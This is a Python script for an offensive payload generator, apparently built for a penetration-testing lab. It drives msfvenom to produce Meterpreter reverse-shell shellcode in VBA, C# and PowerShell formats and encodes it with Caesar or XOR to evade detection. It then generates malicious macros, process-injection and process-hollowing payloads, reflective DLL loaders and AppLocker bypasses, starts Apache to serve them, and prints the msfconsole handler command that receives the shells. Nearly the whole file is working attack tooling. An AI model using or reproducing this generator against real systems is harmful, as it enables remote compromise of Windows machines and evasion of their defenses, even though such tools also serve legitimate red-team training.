 #!/bin/python3
import subprocess
import os
import socket
import random
import netifaces
import time
from colorama import init
from termcolor import colored
import json
## import payload modules ##
import payloads.vba_payloads as vba
import payloads.cs_payloads as c_sharp
import payloads.ps_payloads as ps
import payloads.jscript_payloads as jscript
import payloads.cs_process_migration as pm
import payloads.applocker as applocker
 
init()

######################
# Shellcodes
######################
shellcodes = {
    "vba_shellcode": "", 
    "c_shellcode": "", 
    "ps_shellcode": "" }

######################
# Global variables
######################
_lhost = "192.168.119.158"
_lport = 443
_arch = ["x86", "x64"]

######################
# Functions
######################
def read_file(self, f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content


def generateMetasploitShellcodes(lhost, lport, payload, arch):
    # Generate Metasploit shellcode for reverse shell
    print(colored(f"[+] Generating {arch} Meterpreter shellcodes","green"))

    # if (arch == "x86"):
    #     payload = "windows/meterpreter/reverse_https"
    # elif (arch == "x64"):
    #     payload = "windows/x64/meterpreter/reverse_https"

    ### VBA shellcode
    # msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
    if (not shellcodes["vba_shellcode"]):
        print(colored(f"    [+] msfvenom -p {payload} LHOST={lhost} LPORT={str(lport)} -f vbapplication", "cyan" ))
        vba_shellcode = subprocess.run(["msfvenom", "-p", payload, "LHOST="+lhost, "LPORT="+str(lport), "EXITFUNC=thread", "-f", "vbapplication", ], capture_output=True, text=True)
        shellcodes["vba_shellcode"] = vba_shellcode.stdout


    ### C# shellcode 
    if (not shellcodes["c_shellcode"]):
        print(colored(f"    [+] msfvenom -p {payload} LHOST={lhost} LPORT={str(lport)} -f csharp", "cyan" ))
        c_shellcode = subprocess.run(["msfvenom", "-p", payload, "LHOST="+lhost, "LPORT="+str(lport), "-f", "csharp"], capture_output=True, text=True)
        shellcodes["c_shellcode"] = c_shellcode.stdout

    # x86 PowerShell shellcode: 
    # msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
    if (not shellcodes["ps_shellcode"]):
        print(colored(f"    [+] msfvenom -p {payload} LHOST={lhost} LPORT={str(lport)} EXITFUNC=thread -f ps1", "cyan" ))
        ps_shellcode = subprocess.run(["msfvenom", "-p", payload, "LHOST="+lhost, "LPORT="+str(lport), "EXITFUNC=thread", "-f", "ps1"], capture_output=True, text=True)
        shellcodes["ps_shellcode"] = ps_shellcode.stdout

    # C# DLL loading with PowerShell
    # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll

def getData():
    # global variables
    global _lhost
    global _lport
    global _arch

    #read config file
    with open("config.json", "r") as configFile:
        config_data = json.load(configFile)

    ## Get IP address
    print("\nLocal IPs:")
    i = 1
    ips = []
    for interface in netifaces.interfaces():
        if (netifaces.AF_INET in netifaces.ifaddresses(interface)):
            for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
                print(f"[{i}] [{interface}] {link['addr']}")
                i = i + 1
                ips.append(link['addr'])
    print(f"[9] Other")
    ip = input("[>] Select lhost: ")
    #print(ip)
    #print(_lhost)
    #print(netifaces.ifaddresses("eth0")[netifaces.AF_INET])
    if (ip.strip()):
        if (ip.strip() == "9"):
            lhost = input("[>] Provide IP address: ")
            _lhost = lhost
            config_data["lhost"] = lhost
        else:
            _lhost = ips[int(ip)-1]
            config_data["lhost"] = ips[int(ip)-1]
    else:
        # use eth0 interface
        _lhost = netifaces.ifaddresses("eth0")[netifaces.AF_INET][0]["addr"]
        config_data["lhost"] = netifaces.ifaddresses("eth0")[netifaces.AF_INET][0]["addr"]

    ## Get Port 
    _lport = int(input("\n[>] Type lport (443): ").strip() or "443")
    config_data["lport"] = _lport
        
    ## Get Architecture
    arch = input(f"""\nArchitecture:
[1] x86
[2] x64
[3] ALL (default)
[>] Select architecture: """)
    
    if (not arch):
        _arch = ["x86", "x64"]
        config_data["arch"] = ["x86", "x64"]
    elif (arch == "x86" or int(arch) == 1):
        _arch = ["x86"]
        config_data["arch"] = ["x86"]
    elif (arch == "x64" or int(arch) == 2):
        _arch = ["x64"]
        config_data["arch"] = ["x64"]
    else:
        _arch = ["x86", "x64"]
        config_data["arch"] = ["x86", "x64"]




    ## Get msf payload
    msf_payload = input(f"""\nSelect msf payload:
[1] meterpreter/reverse_https (default)
[2] meterpreter/reverse_tcp
[3] shell/reverse_tcp
[9] other                        
[>] Select msf payload: """)
    
    if (not msf_payload):
        config_data["msf_payload"] = "meterpreter/reverse_https"
    elif (int(msf_payload) == 1):
        config_data["msf_payload"] = "meterpreter/reverse_https"
    elif (int(msf_payload) == 2):
        config_data["msf_payload"] = "meterpreter/reverse_tcp"
    elif (int(msf_payload) == 3):
        config_data["msf_payload"] = "shell/reverse_tcp"
    elif (int(msf_payload) == 9):
        config_data["msf_payload"] = input("[>] Provide msf payload:  ")
    else:
        config_data["msf_payload"] = "meterpreter/reverse_https"


    ## Get Payload Type
    payload_type = input(f"""\nPayload type:
[1] Initial Vector
[2] Process Migration
[3] AppLocker Bypass
[4] ALL
[>] Select architecture: """)
    
    if (not payload_type):
        config_data["payload_type"] = []
    elif (int(payload_type) == 1):
        config_data["payload_type"] = ["initial"]
    elif (int(payload_type) == 2):
        config_data["payload_type"] = ["migration"]
    elif (int(payload_type) == 3):
        config_data["payload_type"] = ["applocker"] 
    elif (int(payload_type) == 4):
        config_data["payload_type"] = ["initial", "migration", "applocker"]
    else:
        config_data["payload_type"] = []


    ## Get shellcode encoding technique
    enc_technique = input(f"""\nShellcode encoding technique:
[1] Cesar Cipher (default)
[2] XOR
[>] Select technique: """)
    
    if (not enc_technique):
        config_data["enc_technique"] = "cesar"
    elif (enc_technique =="cesar" or int(enc_technique) == 1):
        config_data["enc_technique"] = "cesar"
    elif (enc_technique =="cxor" or int(enc_technique)== 2):
        config_data["enc_technique"] = "xor"
    else:
        config_data["enc_technique"] = "cesar"


    print(f"""Provided data:
        Lhost: {_lhost}
        Lport: {_lport}
        Arch: {_arch}
        MSF payload: {config_data["msf_payload"]}
        Payload types: {config_data["payload_type"]}
        Shellcode encoding: {config_data["enc_technique"]}
        """)
    
    # write changes to config file
    with open("config.json", "w") as configFile:
        json.dump(config_data, configFile, indent=4, sort_keys=True)

    configFile.close()


def startNewProcess():
    pid = os.fork()
    if pid == 0:
    # Child process
        os.setsid()  # Create a new session
        #os.execlp("qterminal", "qterminal")
        with open(os.devnull, 'w') as devnull:
            subprocess.Popen(["qterminal", "-e", "msfconsole -q -x 'use exploit/multi/handler;'"], stderr=devnull, stdout=devnull)
    else:
        # Parent process
        print(f"Started new QTerminal process with PID {pid}")

def startApache():
    
    status = os.system('systemctl is-active --quiet apache2')
    if (status != 0):
        print(colored(f"[+] Starting Apache Web Server" , "green"))
        os.system('systemctl start apache2')
        print(colored(f"    [!]",'red') + colored(" Stop Apache after work", "yellow"))
        print(colored(f"        [>] sudo systemctl stop apache2",'cyan'))
    else:
        print(colored(f"[+] Apache Web Server is running" , "green"))
        print(colored(f"    [!]",'red') + colored(" Stop Apache after work", "yellow"))
        print(colored(f"        [>] sudo systemctl stop apache2",'cyan'))
       

######################
# Main 
######################
def main():

    print("Hello World!")

    # update config file
    getData()
    # Start apache web server
    startApache()

    #read config file
    with open("config.json", "r") as configFile:
        config_data = json.load(configFile)

    if (len(config_data["payload_type"]) > 0):

        for arch in config_data["arch"]:
            print()
            print(colored(f"[+] Architecture {arch}", "white", "on_magenta"))

            msf_payload = ""

            if (arch == "x86"):
                msf_payload = f"windows/{config_data["msf_payload"]}"
            elif (arch == "x64"):
                msf_payload = f"windows/x64/{config_data["msf_payload"]}"

            print("Multi handler:")
            print(colored(f"\tset payload {msf_payload}", "cyan"))
            # msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.119.158; set lport 443; run"
            print(colored(f"\tmsfconsole -q -x \"use exploit/multi/handler; set payload {msf_payload}; set lhost {config_data['lhost']}; set lport {config_data['lport']}; set ExitOnSession false; run\"","cyan"))

            # create output directory if not exist
            if (not os.path.exists(os.getcwd()+"/output")):
                print("[+] Creating output directory")
                os.mkdir(os.getcwd()+"/output")

            output_dir = f"/output/{arch}"
            if (not os.path.exists(os.getcwd()+output_dir)):
                print("[+] Creating output directory")
                os.mkdir(os.getcwd()+output_dir)


            

            for payload_type in config_data["payload_type"]:   
                
                if (payload_type == "initial"): 
                    ### Generate shellcodes
                    generateMetasploitShellcodes(config_data["lhost"],config_data["lport"], msf_payload, arch)

                    #### Generating payloads
                    c_sharp.generateCPayload(config_data["enc_technique"], shellcodes["c_shellcode"], arch)
                    c_sharp.generateCDllPayload(config_data["enc_technique"], shellcodes["c_shellcode"], arch)
                    ps.generatePsPayload(shellcodes["ps_shellcode"], arch)
                    ps.generatePsDllPayload(config_data["lhost"], arch)
                    vba.generateMacroPayloadWithPS(config_data['lhost'], 80, arch) # requires PS payloads
                    vba.generateMacroPayload(config_data["enc_technique"], shellcodes["vba_shellcode"], arch) 
                    jscript.generateJScriptPayload(config_data["lhost"], config_data["lport"]) # requires managed DLL created manually
                    

                elif (payload_type == "migration"):

                    ### Generate shellcodes
                    generateMetasploitShellcodes(config_data["lhost"],config_data["lport"], msf_payload, arch)

                    ### Process migration
                        
                    # create output process migration directory if not exist
                    if (not os.path.exists(os.getcwd()+"/output/process_migration")):
                        print("[+] Creating output process migration directory")
                        os.mkdir(os.getcwd()+"/output/process_migration")
                    
                    output_dir = f"/output/process_migration/{arch}"
                    if (not os.path.exists(os.getcwd()+output_dir)):
                        print("[+] Creating output process migration directory")
                        os.mkdir(os.getcwd()+output_dir)

                    pm.generateProcessInjection(config_data["enc_technique"], shellcodes["c_shellcode"], arch)
                    pm.generateProcessHollowing(config_data["enc_technique"], shellcodes["c_shellcode"], arch)
                    pm.dllInection(config_data["lhost"], config_data["lport"], arch)
                    pm.reflectiveDllInjection(config_data["lhost"], config_data["lport"], arch)


                #### AppLocker bypass
                elif (payload_type == "applocker"):
                    
                        
                    # create output process migration directory if not exist
                    if (not os.path.exists(os.getcwd()+"/output/applocker")):
                        print("[+] Creating output applocker directory")
                        os.mkdir(os.getcwd()+"/output/applocker")
                    
                    output_dir = f"/output/applocker/{arch}"
                    if (not os.path.exists(os.getcwd()+output_dir)):
                        print("[+] Creating output process migration directory")
                        os.mkdir(os.getcwd()+output_dir)

                    applocker.al_reflectiveDllInjection(config_data["lhost"], config_data["lport"], arch)
                    jscript.generateHtaJScriptPayload(arch) # requires js from DotNetToJscript in /mnt/tools
    else:
        print()
        print(colored(f"[!]",'red') + colored(" Payload type was not selected!", "yellow"))



    # Starting new terminal
    #startNewProcess()    


if __name__ == "__main__":
    main()